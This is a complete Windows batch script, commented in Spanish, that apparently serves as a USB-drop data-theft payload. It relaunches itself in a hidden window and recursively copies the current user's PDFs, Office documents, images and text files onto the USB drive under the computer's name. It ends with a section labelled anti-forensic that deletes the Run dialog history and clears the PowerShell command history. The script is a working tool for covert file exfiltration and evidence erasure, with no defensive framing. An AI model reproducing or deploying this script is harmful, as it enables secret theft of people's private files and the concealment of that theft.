@echo off

:: Ejecutarse en segundo plano si no lo esta
if "%1" neq "hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
    exit /b 0
)

:: ====================================================
::               BLOQUE DE CONFIGURACION
:: ====================================================
:: Directorio origen por defecto: Directorio del usuario actual (%USERPROFILE%)
set "ORIGEN=%USERPROFILE%"

:: Extensiones a extraer (separadas por coma)
set "FILTROS=*.pdf,*.docx,*.xlsx,*.png,*.jpg,*.txt"

:: Tamano maximo por archivo en MB (evita saturar la memoria USB)
set "MAX_SIZE_MB=25"

:: ====================================================
::               RESOLUCION DINAMICA DE UNIDAD
:: ====================================================
set "USB_ROOT=%~dp0"
if exist "%~dp0..\..\payloads" (
    for %%I in ("%~dp0..\..") do set "USB_ROOT=%%~fI\"
)

set "FOLDER_DATA=%USB_ROOT%Data"
set "FOLDER_TARGET=%FOLDER_DATA%\%COMPUTERNAME%_data"

if not exist "%FOLDER_TARGET%" (
    mkdir "%FOLDER_TARGET%" 2>nul
)

:: ====================================================
::               EXTRACCION INTELIGENTE
:: ====================================================
powershell -NoProfile -ExecutionPolicy Bypass -Command "$src = '%ORIGEN%'; $dest = '%FOLDER_TARGET%'; $max = [long]%MAX_SIZE_MB% * 1MB; $exts = '%FILTROS%'.Split(','); foreach ($ext in $exts) { Get-ChildItem -Path $src -Filter $ext.Trim() -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Length -le $max } | ForEach-Object { $cleanName = ($_.FullName.Replace($src, '').TrimStart('\', '/')).Replace('\', '_').Replace('/', '_'); $destFile = Join-Path $dest $cleanName; Copy-Item -Path $_.FullName -Destination $destFile -Force -ErrorAction SilentlyContinue } }"

:: ====================================================
::               LIMPIEZA ANTI-FORENSE (OPSEC)
:: ====================================================
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "if (Get-Command Get-PSReadLineOption -ErrorAction SilentlyContinue) { $h = (Get-PSReadLineOption).HistorySavePath; if (Test-Path $h) { Clear-Content $h -Force -ErrorAction SilentlyContinue } }" >nul 2>&1

exit /b 0